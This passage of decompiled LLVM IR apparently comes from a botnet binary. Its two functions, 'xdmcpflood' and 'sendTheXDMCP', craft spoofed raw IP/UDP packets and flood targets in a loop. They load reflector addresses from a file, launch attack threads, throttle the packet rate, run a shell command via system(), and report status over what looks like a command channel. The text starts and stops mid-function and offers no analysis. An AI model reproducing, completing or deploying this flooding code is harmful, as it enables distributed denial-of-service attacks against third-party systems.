}

define i32 @xdmcpflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %v2_100068fc = ptrtoint i32* %stack_var_-4144 to i32
  %v1_10006908 = add i32 %v2_100068fc, 20
  %v5_1000690c = inttoptr i32 %v1_10006908 to i16*
  %v1_10006918 = add i32 %arg1, 12
  %v2_10006918 = inttoptr i32 %v1_10006918 to i32*
  %v3_10006918 = load i32, i32* %v2_10006918, align 4
  %v1_10006938 = add i32 %arg1, 4
  %v2_10006938 = inttoptr i32 %v1_10006938 to i32*
  %v3_10006938 = load i32, i32* %v2_10006938, align 4
  store i32 268462416, i32* @lr, align 4
  %v3_1000694c = call i32 @socket(i32 2, i32 3, i32 6)
  %tmp26 = icmp sgt i32 %v3_1000694c, -1
  br i1 %tmp26, label %dec_label_pc_1000696c, label %dec_label_pc_10006964

dec_label_pc_10006964:                            ; preds = %entry
  %v0_10006968 = call i32 @__GI_exit()
  br label %dec_label_pc_1000696c

dec_label_pc_1000696c:                            ; preds = %entry, %dec_label_pc_10006964
  store i32 268462452, i32* @lr, align 4
  %v1_10006970 = call i32 @__GI_time(i32 0)
  %v1_1000697c = call i32 @init_rand(i32 %v1_10006970)
  store i32 %v2_100068fc, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268462488, i32* @lr, align 4
  %v0_10006994 = call i32 @__GI_memset()
  store i32 268462496, i32* @lr, align 4
  %v2_1000699c = call i32 @setup_xdmcp_ip_header(i32* nonnull %stack_var_-4144)
  store i32 268462504, i32* @lr, align 4
  %v2_100069a4 = call i32 @setup_xdmcp_udp_header(i16* %v5_1000690c)
  store i32 268462508, i32* @lr, align 4
  %v0_100069a8 = call i32 @random()
  %v2_100069c8 = srem i32 %v0_100069a8, 65535
  %fold = add nsw i32 %v2_100069c8, 64510
  %v1_100069f4 = urem i32 %fold, 65536
  store i32 %v1_100069f4, i32* @r3, align 4
  %v1_100069fc = call i32 @htons(i32 %v1_100069f4)
  %v1_10006a08 = trunc i32 %v1_100069fc to i16
  store i16 %v1_10006a08, i16* %v5_1000690c, align 4
  %v2_10006a14 = add i32 %v2_100068fc, 12
  %v3_10006a14 = inttoptr i32 %v2_10006a14 to i32*
  store i32 %v3_10006918, i32* %v3_10006a14, align 4
  %v1_10006a1c = add i32 %v3_10006938, 4
  %v2_10006a1c = inttoptr i32 %v1_10006a1c to i32*
  %v3_10006a1c = load i32, i32* %v2_10006a1c, align 4
  %v2_10006a24 = add i32 %v2_100068fc, 16
  %v3_10006a24 = inttoptr i32 %v2_10006a24 to i32*
  store i32 %v3_10006a1c, i32* %v3_10006a24, align 4
  %v1_10006a30 = or i32 %v2_100068fc, 2
  %v2_10006a30 = inttoptr i32 %v1_10006a30 to i16*
  %v3_10006a30 = load i16, i16* %v2_10006a30, align 2
  %div = udiv i16 %v3_10006a30, 2
  %v1_10006a38 = zext i16 %div to i32
  %v2_10006a48 = bitcast i32* %stack_var_-4144 to i16*
  %v3_10006a48 = call i32 @csum(i16* %v2_10006a48, i32 %v1_10006a38)
  %v1_10006a54 = trunc i32 %v3_10006a48 to i16
  %v3_10006a54 = add i32 %v2_100068fc, 10
  %v4_10006a54 = inttoptr i32 %v3_10006a54 to i16*
  store i16 %v1_10006a54, i16* %v4_10006a54, align 2
  store i32 1, i32* %stack_var_-32, align 4
  %v2_10006a60 = ptrtoint i32* %stack_var_-32 to i32
  store i32 268462720, i32* @lr, align 4
  %v5_10006a7c = call i32 @__GI_setsockopt(i32 %v3_1000694c, i32 0, i32 3, i32 %v2_10006a60, i32 4)
  %tmp28 = icmp sgt i32 %v5_10006a7c, -1
  br i1 %tmp28, label %dec_label_pc_10006a94, label %dec_label_pc_10006a8c

dec_label_pc_10006a8c:                            ; preds = %dec_label_pc_1000696c
  %v0_10006a90 = call i32 @__GI_exit()
  br label %dec_label_pc_10006a94

dec_label_pc_10006a94:                            ; preds = %dec_label_pc_1000696c, %dec_label_pc_10006a8c
  store i32 268462748, i32* @lr, align 4
  %v1_10006a98 = call i32 @__GI_time(i32 0)
  %v1_10006aa4 = call i32 @init_rand(i32 %v1_10006a98)
  %v3_10006b20 = add i32 %v2_100068fc, 4
  %v4_10006b20 = inttoptr i32 %v3_10006b20 to i16*
  br label %dec_label_pc_10006ab0

dec_label_pc_10006ab0:                            ; preds = %dec_label_pc_10006b94, %dec_label_pc_10006a94
  %stack_var_-4160.0 = phi i32 [ %v3_10006938, %dec_label_pc_10006a94 ], [ %v3_10006aec, %dec_label_pc_10006b94 ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_10006a94 ], [ %v1_10006b98, %dec_label_pc_10006b94 ]
  %v3_10006ab4 = load i16, i16* %v2_10006a30, align 2
  %v4_10006ab4 = zext i16 %v3_10006ab4 to i32
  store i32 268462824, i32* @lr, align 4
  %v6_10006ae4 = call i32 @sendto(i32 %v3_1000694c, i32 %v2_100068fc, i32 %v4_10006ab4, i32 0, i32 %stack_var_-4160.0, i32 16)
  %v1_10006aec = add i32 %stack_var_-4160.0, 532
  %v2_10006aec = inttoptr i32 %v1_10006aec to i32*
  %v3_10006aec = load i32, i32* %v2_10006aec, align 4
  %v1_10006af8 = add i32 %v3_10006aec, 4
  %v2_10006af8 = inttoptr i32 %v1_10006af8 to i32*
  %v3_10006af8 = load i32, i32* %v2_10006af8, align 4
  store i32 %v3_10006af8, i32* %v3_10006a24, align 4
  %v0_10006b04 = call i32 @rand_cmwc()
  store i32 %v0_10006b04, i32* @r3, align 4
  %v1_10006b10 = call i32 @htonl(i32 %v0_10006b04)
  %v1_10006b20 = trunc i32 %v1_10006b10 to i16
  store i16 %v1_10006b20, i16* %v4_10006b20, align 4
  %v3_10006b2c = load i16, i16* %v2_10006a30, align 2
  %div29 = udiv i16 %v3_10006b2c, 2
  %v1_10006b34 = zext i16 %div29 to i32
  %v3_10006b44 = call i32 @csum(i16* %v2_10006a48, i32 %v1_10006b34)
  %v1_10006b50 = trunc i32 %v3_10006b44 to i16
  store i16 %v1_10006b50, i16* %v4_10006a54, align 2
  %v3_10006b58 = load i32, i32* @global_var_100451ac.120, align 4
  %v1_10006b5c = add i32 %v3_10006b58, 1
  store i32 %v1_10006b5c, i32* @global_var_100451ac.120, align 4
  %v3_10006b6c = load i32, i32* @global_var_10045194.121, align 4
  %v3_10006b74 = icmp ugt i32 %v3_10006b6c, %storemerge4
  br i1 %v3_10006b74, label %dec_label_pc_10006b94, label %dec_label_pc_10006b7c

dec_label_pc_10006b7c:                            ; preds = %dec_label_pc_10006ab0
  %v3_10006b88 = load i32, i32* @global_var_100450d4.122, align 4
  store i32 268462996, i32* @lr, align 4
  %v1_10006b90 = call i32 @usleep(i32 %v3_10006b88)
  br label %dec_label_pc_10006b94

dec_label_pc_10006b94:                            ; preds = %dec_label_pc_10006ab0, %dec_label_pc_10006b7c
  %stack_var_-20.0 = phi i32 [ %storemerge4, %dec_label_pc_10006ab0 ], [ 0, %dec_label_pc_10006b7c ]
  %v1_10006b98 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_10006ab0

; uselistorder directives
  uselistorder i32 %v3_10006aec, { 1, 0 }
  uselistorder i32 %stack_var_-4160.0, { 1, 0 }
  uselistorder i32 %v1_100069f4, { 1, 0 }
  uselistorder i32 %v2_100068fc, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder i32* %stack_var_-4144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_10006b94, { 1, 0 }
  uselistorder label %dec_label_pc_10006a94, { 1, 0 }
  uselistorder label %dec_label_pc_1000696c, { 1, 0 }
}

define i32 @sendTheXDMCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-1168 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10006ba4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10006ba4, i32* %stack_var_-1168, align 4
  %v5_10006ba4 = ptrtoint i32* %stack_var_-1168 to i32
  %v1_10006bdc = call i32 @mfork(i32 %arg2)
  %v3_10006be4 = icmp eq i32 %v1_10006bdc, 0
  br i1 %v3_10006be4, label %dec_label_pc_10006bec, label %dec_label_pc_10007294

dec_label_pc_10006bec:                            ; preds = %entry
  store i32 268463100, i32* @lr, align 4
  %v3_10006bf8 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp40 = icmp sgt i32 %v3_10006bf8, -1
  br i1 %tmp40, label %dec_label_pc_10006c18, label %dec_label_pc_10006c10

dec_label_pc_10006c10:                            ; preds = %dec_label_pc_10006bec
  %v0_10006c14 = call i32 @__GI_exit()
  br label %dec_label_pc_10006c18

dec_label_pc_10006c18:                            ; preds = %dec_label_pc_10006bec, %dec_label_pc_10006c10
  %v2_10006c1c = icmp sgt i32 %arg3, 5
  br i1 %v2_10006c1c, label %dec_label_pc_10006c44, label %dec_label_pc_10006c24

dec_label_pc_10006c24:                            ; preds = %dec_label_pc_10006c18
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10006c38 = call i32 @Send(i32 %arg1, i32 ptrtoint ([114 x i8]* @global_var_1002ad2c.308 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_10006c40 = call i32 @__GI_exit()
  br label %dec_label_pc_10006c44

dec_label_pc_10006c44:                            ; preds = %dec_label_pc_10006c18, %dec_label_pc_10006c24
  store i32 268463180, i32* @lr, align 4
  %v1_10006c48 = call i32 @__GI_time(i32 0)
  %v1_10006c58 = add i32 %arg4, 24
  store i32 %v1_10006c58, i32* %r9.global-to-local, align 4
  %v1_10006c5c = inttoptr i32 %v1_10006c58 to i32*
  %v2_10006c5c = load i32, i32* %v1_10006c5c, align 4
  %v1_10006c68 = add i32 %arg4, 12
  store i32 %v1_10006c68, i32* %r9.global-to-local, align 4
  %v1_10006c6c = inttoptr i32 %v1_10006c68 to i32*
  %v2_10006c6c = load i32, i32* %v1_10006c6c, align 4
  store i32 %v2_10006c6c, i32* @r3, align 4
  %v0_10006c74 = call i32 @__GI_strlen()
  %v1_10006c7c = mul i32 %v0_10006c74, 5
  store i32 %v1_10006c7c, i32* %r9.global-to-local, align 4
  %v1_10006c80 = add i32 %v1_10006c7c, 160
  %v2_10006c8c = icmp sgt i32 %v1_10006c80, 1023
  br i1 %v2_10006c8c, label %dec_label_pc_10007294, label %dec_label_pc_10006c94

dec_label_pc_10006c94:                            ; preds = %dec_label_pc_10006c44
  store i32 %v1_10006c68, i32* %r9.global-to-local, align 4
  %v2_10006ca0 = load i32, i32* %v1_10006c6c, align 4
  store i32 %v1_10006c68, i32* %r9.global-to-local, align 4
  %v2_10006cac = load i32, i32* %v1_10006c6c, align 4
  store i32 %v1_10006c68, i32* %r9.global-to-local, align 4
  %v2_10006cb8 = load i32, i32* %v1_10006c6c, align 4
  store i32 %v1_10006c68, i32* %r9.global-to-local, align 4
  %v2_10006cc4 = load i32, i32* %v1_10006c6c, align 4
  store i32 %v1_10006c68, i32* %r9.global-to-local, align 4
  %v2_10006cd0 = load i32, i32* %v1_10006c6c, align 4
  store i32 %v2_10006cd0, i32* %r11.global-to-local, align 4
  %v2_10006cd4 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_10006cd4, i32* @r3, align 4
  store i32 %v1_10006c80, i32* @r4, align 4
  store i32 ptrtoint ([166 x i8]* @global_var_1002ada0.311 to i32), i32* @r5, align 4
  store i32 %v2_10006cc4, i32* %r9.global-to-local, align 4
  store i32 268463360, i32* @lr, align 4
  %v9_10006cfc = call i32 @__GI_snprintf(i32 %v2_10006cd4, i32 %v1_10006c80, i32 ptrtoint ([166 x i8]* @global_var_1002ada0.311 to i32), i32 %v2_10006ca0, i32 %v2_10006cac, i32 %v2_10006cb8, i32 %v2_10006cc4, i32 %v1_10006c80)
  store i32 ptrtoint ([3 x i8]* @global_var_10006d0c.312 to i32), i32* @lr, align 4
  %v1_10006d08 = call i32 @system(i32 %v2_10006cd4)
  store i32 268463380, i32* @lr, align 4
  %v1_10006d10 = call i32 @__GI_time(i32 0)
  store i32 ptrtoint (i32* @global_var_10006d20.313 to i32), i32* @lr, align 4
  %v1_10006d1c = call i32 @srand(i32 %v1_10006d10)
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_100451b4.106, align 4
  store i32 128, i32* @r3, align 4
  store i32 268463432, i32* @lr, align 4
  %v0_10006d44 = call i32 @malloc()
  store i32 128, i32* %r9.global-to-local, align 4
  store i32 %v0_10006d44, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  store i32 268463464, i32* @lr, align 4
  %v0_10006d64 = call i32 @__GI_memset()
  %v1_10006d74 = add i32 %arg4, 16
  store i32 %v1_10006d74, i32* %r9.global-to-local, align 4
  %v1_10006d78 = inttoptr i32 %v1_10006d74 to i32*
  %v2_10006d78 = load i32, i32* %v1_10006d78, align 4
  store i32 268463492, i32* @lr, align 4
  %v1_10006d80 = call i32 @atol(i32 %v2_10006d78)
  %v1_10006d90 = add i32 %arg4, 20
  store i32 %v1_10006d90, i32* %r9.global-to-local, align 4
  %v1_10006d94 = inttoptr i32 %v1_10006d90 to i32*
  %v2_10006d94 = load i32, i32* %v1_10006d94, align 4
  store i32 268463520, i32* @lr, align 4
  %v1_10006d9c = call i32 @atol(i32 %v2_10006d94)
  store i32 0, i32* @global_var_10045194.121, align 4
  store i32 0, i32* @global_var_100451ac.120, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 268463580, i32* @lr, align 4
  %v3_10006dd8 = call i32 @__GI_fopen(i32 ptrtoint ([7 x i8]* @global_var_1002ae48.314 to i32), i32 ptrtoint ([2 x i8]* @global_var_1002a6f0.111 to i32))
  %v2_10006dfc = add i32 %v0_10006d64, -1
  br label %dec_label_pc_10006f74.outer

dec_label_pc_10006de8:                            ; preds = %dec_label_pc_10006f74
  store i32 %v0_10006d64, i32* @r3, align 4
  %v0_10006dec = call i32 @__GI_strlen()
  %v1_10006e00 = add i32 %v0_10006dec, %v2_10006dfc
  store i32 %v1_10006e00, i32* %r9.global-to-local, align 4
  %v1_10006e04 = inttoptr i32 %v1_10006e00 to i8*
  %v2_10006e04 = load i8, i8* %v1_10006e04, align 1
  %v3_10006e0c = icmp eq i8 %v2_10006e04, 10
  br i1 %v3_10006e0c, label %dec_label_pc_10006e40, label %dec_label_pc_10006e14

dec_label_pc_10006e14:                            ; preds = %dec_label_pc_10006de8
  store i32 %v0_10006d64, i32* @r3, align 4
  %v0_10006e18 = call i32 @__GI_strlen()
  %v1_10006e2c = add i32 %v0_10006e18, %v2_10006dfc
  store i32 %v1_10006e2c, i32* %r9.global-to-local, align 4
  %v1_10006e30 = inttoptr i32 %v1_10006e2c to i8*
  %v2_10006e30 = load i8, i8* %v1_10006e30, align 1
  %v3_10006e38 = icmp eq i8 %v2_10006e30, 13
  br i1 %v3_10006e38, label %dec_label_pc_10006e40, label %dec_label_pc_10006f74

dec_label_pc_10006e40:                            ; preds = %dec_label_pc_10006e14, %dec_label_pc_10006de8
  store i32 %v0_10006d64, i32* @r3, align 4
  %v0_10006e44 = call i32 @__GI_strlen()
  %v1_10006e58 = add i32 %v0_10006e44, %v2_10006dfc
  %v3_10006e60 = inttoptr i32 %v1_10006e58 to i8*
  store i8 0, i8* %v3_10006e60, align 1
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10006e68 = load i32, i32* @global_var_100451b4.106, align 4
  %v3_10006e6c = icmp eq i32 %v3_10006e68, 0
  store i32 540, i32* @r3, align 4
  br i1 %v3_10006e6c, label %dec_label_pc_10006e74, label %dec_label_pc_10006ef8

dec_label_pc_10006e74:                            ; preds = %dec_label_pc_10006e40
  store i32 268463740, i32* @lr, align 4
  %v0_10006e78 = call i32 @malloc()
  store i32 %v0_10006e78, i32* @global_var_100451b4.106, align 4
  store i32 %v0_10006e78, i32* %r9.global-to-local, align 4
  %v2_10006e98 = inttoptr i32 %v0_10006e78 to i32*
  store i32 0, i32* %v2_10006e98, align 4
  %v1_10006ea0 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006ea0 = add i32 %v1_10006ea0, 4
  %v3_10006ea0 = inttoptr i32 %v2_10006ea0 to i32*
  store i32 0, i32* %v3_10006ea0, align 4
  %v1_10006ea8 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006ea8 = add i32 %v1_10006ea8, 8
  %v3_10006ea8 = inttoptr i32 %v2_10006ea8 to i32*
  store i32 0, i32* %v3_10006ea8, align 4
  %v1_10006eb0 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006eb0 = add i32 %v1_10006eb0, 12
  %v3_10006eb0 = inttoptr i32 %v2_10006eb0 to i32*
  store i32 0, i32* %v3_10006eb0, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10006eb8 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 268463812, i32* @lr, align 4
  %v1_10006ec0 = call i32 @inet_addr(i32 %v0_10006d64)
  %v2_10006ec8 = add i32 %v3_10006eb8, 4
  %v3_10006ec8 = inttoptr i32 %v2_10006ec8 to i32*
  store i32 %v1_10006ec0, i32* %v3_10006ec8, align 4
  %v3_10006ed0 = load i32, i32* @global_var_100451b4.106, align 4
  %v2_10006edc = add i32 %v3_10006ed0, 532
  %v3_10006edc = inttoptr i32 %v2_10006edc to i32*
  store i32 %v3_10006ed0, i32* %v3_10006edc, align 4
  %v3_10006ee4 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10006ee4, i32* %r11.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v2_10006ef0 = add i32 %v3_10006ee4, 536
  %v3_10006ef0 = inttoptr i32 %v2_10006ef0 to i32*
  store i32 %v3_10006ee4, i32* %v3_10006ef0, align 4
  br label %dec_label_pc_10006f68

dec_label_pc_10006ef8:                            ; preds = %dec_label_pc_10006e40
  store i32 268463872, i32* @lr, align 4
  %v0_10006efc = call i32 @malloc()
  store i32 540, i32* %r9.global-to-local, align 4
  store i32 %v0_10006efc, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 540, i32* @r5, align 4
  store i32 268463904, i32* @lr, align 4
  %v0_10006f1c = call i32 @__GI_memset()
  store i32 268463912, i32* @lr, align 4
  %v1_10006f24 = call i32 @inet_addr(i32 %v0_10006d64)
  %v2_10006f30 = add i32 %v0_10006efc, 4
  %v3_10006f30 = inttoptr i32 %v2_10006f30 to i32*
  store i32 %v1_10006f24, i32* %v3_10006f30, align 4
  %v3_10006f38 = load i32, i32* @global_var_100451b4.106, align 4
  %v2_10006f40 = add i32 %v0_10006efc, 536
  %v3_10006f40 = inttoptr i32 %v2_10006f40 to i32*
  store i32 %v3_10006f38, i32* %v3_10006f40, align 4
  %v3_10006f48 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10006f48, i32* %r9.global-to-local, align 4
  %v1_10006f4c = add i32 %v3_10006f48, 532
  %v2_10006f4c = inttoptr i32 %v1_10006f4c to i32*
  %v3_10006f4c = load i32, i32* %v2_10006f4c, align 4
  %v2_10006f54 = add i32 %v0_10006efc, 532
  %v3_10006f54 = inttoptr i32 %v2_10006f54 to i32*
  store i32 %v3_10006f4c, i32* %v3_10006f54, align 4
  %v3_10006f5c = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10006f5c, i32* %r9.global-to-local, align 4
  %v2_10006f64 = add i32 %v3_10006f5c, 532
  %v3_10006f64 = inttoptr i32 %v2_10006f64 to i32*
  store i32 %v0_10006efc, i32* %v3_10006f64, align 4
  br label %dec_label_pc_10006f68

dec_label_pc_10006f68:                            ; preds = %dec_label_pc_10006e74, %dec_label_pc_10006ef8
  store i32 %stack_var_-1128.0.ph, i32* %r9.global-to-local, align 4
  %v1_10006f6c = add i32 %stack_var_-1128.0.ph, 1
  br label %dec_label_pc_10006f74.outer

dec_label_pc_10006f74.outer:                      ; preds = %dec_label_pc_10006f68, %dec_label_pc_10006c94
  %stack_var_-1128.0.ph = phi i32 [ %v1_10006f6c, %dec_label_pc_10006f68 ], [ 0, %dec_label_pc_10006c94 ]
  br label %dec_label_pc_10006f74

dec_label_pc_10006f74:                            ; preds = %dec_label_pc_10006f74.outer, %dec_label_pc_10006e14
  store i32 268464004, i32* @lr, align 4
  %v3_10006f80 = call i32 @fgets(i32 %v0_10006d64, i32 128, i32 %v3_10006dd8)
  %v3_10006f88 = icmp eq i32 %v3_10006f80, 0
  br i1 %v3_10006f88, label %dec_label_pc_10006f90, label %dec_label_pc_10006de8

dec_label_pc_10006f90:                            ; preds = %dec_label_pc_10006f74
  %v3_10006f94 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10006f94, i32* %r9.global-to-local, align 4
  %v1_10006f98 = add i32 %v3_10006f94, 532
  %v2_10006f98 = inttoptr i32 %v1_10006f98 to i32*
  %v3_10006f98 = load i32, i32* %v2_10006f98, align 4
  %v1_10006fa4 = mul i32 %v1_10006d80, 4
  %v1_10006fac = add i32 %v1_10006fa4, 30
  %v1_10006fb0 = and i32 %v1_10006fac, -16
  %v2_10006fb8 = load i32, i32* %stack_var_-1168, align 4
  %v1_10006fc0 = load i32, i32* @r1, align 4
  %v3_10006fc0 = sub i32 %v1_10006fc0, %v1_10006fb0
  %v4_10006fc0 = inttoptr i32 %v3_10006fc0 to i32*
  store i32 %v2_10006fb8, i32* %v4_10006fc0, align 4
  %v1_10006fd0 = add i32 %v3_10006fc0, 23
  %v1_10006fd4 = and i32 %v1_10006fd0, -16
  %v1_10006ff4 = add i32 %arg4, 4
  store i32 %v1_10006ff4, i32* %r9.global-to-local, align 4
  %v1_10006ff8 = inttoptr i32 %v1_10006ff4 to i32*
  %v2_10006ff8 = load i32, i32* %v1_10006ff8, align 4
  store i32 268464132, i32* @lr, align 4
  %v1_10007000 = call i32 @inet_addr(i32 %v2_10006ff8)
  %v1_10007010 = mul i32 %v1_10006d80, 24
  %v1_10007014 = add i32 %v1_10007010, 15
  store i32 %v1_10007014, i32* %r9.global-to-local, align 4
  %v1_10007018 = add i32 %v1_10007010, 30
  %v1_1000701c = and i32 %v1_10007018, -16
  %v0_10007024 = load i32, i32* @r1, align 4
  %v1_10007024 = inttoptr i32 %v0_10007024 to i32*
  %v2_10007024 = load i32, i32* %v1_10007024, align 4
  %v3_1000702c = sub i32 %v0_10007024, %v1_1000701c
  %v4_1000702c = inttoptr i32 %v3_1000702c to i32*
  store i32 %v2_10007024, i32* %v4_1000702c, align 4
  %v1_1000703c = add i32 %v3_1000702c, 23
  %v1_10007040 = and i32 %v1_1000703c, -16
  store i32 %v1_10006d80, i32* %r9.global-to-local, align 4
  %v2_100071102 = icmp sgt i32 %v1_10006d80, 0
  br i1 %v2_100071102, label %dec_label_pc_10007060, label %dec_label_pc_10007118

dec_label_pc_10007060:                            ; preds = %dec_label_pc_10006f90, %dec_label_pc_10007060
  %storemerge15 = phi i32 [ %v1_10007100, %dec_label_pc_10007060 ], [ 0, %dec_label_pc_10006f90 ]
  %v1_10007068 = mul i32 %storemerge15, 24
  %v2_1000706c = add i32 %v1_10007068, %v1_10007040
  %v2_10007074 = inttoptr i32 %v2_1000706c to i32*
  store i32 %storemerge15, i32* %v2_10007074, align 8
  store i32 %v2_1000706c, i32* %r9.global-to-local, align 4
  store i32 %v1_10007000, i32* %r11.global-to-local, align 4
  store i32 %tmp7, i32* @r8, align 4
  %v2_10007098 = add i32 %v2_1000706c, 8
  %v3_10007098 = inttoptr i32 %v2_10007098 to i32*
  store i32 2, i32* %v3_10007098, align 8
  %v0_1000709c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000709c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000709c = add i32 %v1_1000709c, 12
  %v3_1000709c = inttoptr i32 %v2_1000709c to i32*
  store i32 %v0_1000709c, i32* %v3_1000709c, align 4
  %v0_100070a0 = load i32, i32* @r10, align 4
  %v1_100070a0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100070a0 = add i32 %v1_100070a0, 16
  %v3_100070a0 = inttoptr i32 %v2_100070a0 to i32*
  store i32 %v0_100070a0, i32* %v3_100070a0, align 4
  %v1_100070a4 = load i32, i32* %r9.global-to-local, align 4
  %v2_100070a4 = add i32 %v1_100070a4, 20
  %v3_100070a4 = inttoptr i32 %v2_100070a4 to i32*
  store i32 %tmp7, i32* %v3_100070a4, align 4
  %v1_100070b8 = or i32 %v2_1000706c, 4
  %v2_100070c0 = inttoptr i32 %v1_100070b8 to i32*
  store i32 %v3_10006f98, i32* %v2_100070c0, align 4
  %v1_100070cc = mul i32 %storemerge15, 4
  %v2_100070d0 = add i32 %v1_100070cc, %v1_10006fd4
  store i32 %v2_100070d0, i32* %r11.global-to-local, align 4
  store i32 268435456, i32* %r9.global-to-local, align 4
  store i32 268464380, i32* @lr, align 4
  %v6_100070f8 = inttoptr i32 %v2_100070d0 to i32*
  %v7_100070f8 = call i32 @pthread_create(i32* %v6_100070f8, i32 0, i32 268462300, i32 %v2_1000706c, i32 %tmp7, i32 268435456)
  %v1_10007100 = add nuw nsw i32 %storemerge15, 1
  store i32 %v1_10006d80, i32* %r9.global-to-local, align 4
  %v2_10007110 = icmp slt i32 %v1_10007100, %v1_10006d80
  br i1 %v2_10007110, label %dec_label_pc_10007060, label %dec_label_pc_10007118

dec_label_pc_10007118:                            ; preds = %dec_label_pc_10007060, %dec_label_pc_10006f90
  store i32 %v1_10006ff4, i32* %r9.global-to-local, align 4
  %v2_10007120 = load i32, i32* %v1_10006ff8, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_1000713c = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002ae50.315 to i32), i32 %arg2, i32 %v2_10007120)
  store i32 %v1_10006c58, i32* %r9.global-to-local, align 4
  %v2_10007150 = load i32, i32* %v1_10006c5c, align 4
  store i32 268464476, i32* @lr, align 4
  %v1_10007158 = call i32 @atol(i32 %v2_10007150)
  %v2_10007164 = mul i32 %v1_10007158, 20
  store i32 %v2_10007164, i32* %r9.global-to-local, align 4
  %v3_1000716c = icmp sgt i32 %v2_10007164, 0
  br i1 %v3_1000716c, label %dec_label_pc_10007174, label %dec_label_pc_1000728c

dec_label_pc_10007174:                            ; preds = %dec_label_pc_10007118
  store i32 1000, i32* %r9.global-to-local, align 4
  store i32 268464524, i32* @lr, align 4
  %v1_10007188 = call i32 @usleep(i32 50000)
  %v3_10007190 = load i32, i32* @global_var_100451ac.120, align 4
  %v2_10007198 = mul i32 %v3_10007190, 20
  %v3_100071a0 = icmp ugt i32 %v2_10007198, %v1_10006d9c
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_100071ac = load i32, i32* @global_var_10045194.121, align 4
  br i1 %v3_100071a0, label %dec_label_pc_100071a8, label %dec_label_pc_100071e8

dec_label_pc_100071a8:                            ; preds = %dec_label_pc_10007174
  %v2_100071b0 = icmp sgt i32 %v3_100071ac, 0
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %v2_100071b0, label %dec_label_pc_100071d0, label %dec_label_pc_100071b8

dec_label_pc_100071b8:                            ; preds = %dec_label_pc_100071a8
  %v3_100071bc = load i32, i32* @global_var_100450d4.122, align 4
  %v1_100071c0 = add i32 %v3_100071bc, 100
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_100071c0, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_10007230

dec_label_pc_100071d0:                            ; preds = %dec_label_pc_100071a8
  %v1_100071d8 = add i32 %v3_100071ac, -1
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_100071d8, i32* @global_var_10045194.121, align 4
  br label %dec_label_pc_10007230

dec_label_pc_100071e8:                            ; preds = %dec_label_pc_10007174
  %v1_100071f0 = add i32 %v3_100071ac, 1
  store i32 %v1_100071f0, i32* @global_var_10045194.121, align 4
  %v3_10007200 = load i32, i32* @global_var_100450d4.122, align 4
  %tmp41 = icmp ult i32 %v3_10007200, 26
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_10007224, label %dec_label_pc_1000720c

dec_label_pc_1000720c:                            ; preds = %dec_label_pc_100071e8
  %v1_10007214 = add i32 %v3_10007200, -25
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10007214, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_10007230

dec_label_pc_10007224:                            ; preds = %dec_label_pc_100071e8
  store i32 0, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_10007230

dec_label_pc_10007230:                            ; preds = %dec_label_pc_1000720c, %dec_label_pc_100071d0, %dec_label_pc_100071b8, %dec_label_pc_10007224
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_100451ac.120, align 4
  %v2_10007260 = add i32 %v2_10006c5c, %v1_10006c48
  br label %dec_label_pc_1000723c

dec_label_pc_1000723c:                            ; preds = %dec_label_pc_1000727c, %dec_label_pc_10007230
  %stack_var_-1120.0 = phi i32 [ %tmp, %dec_label_pc_10007230 ], [ %v1_10007280, %dec_label_pc_1000727c ]
  %tmp42 = icmp slt i32 %stack_var_-1120.0, 100
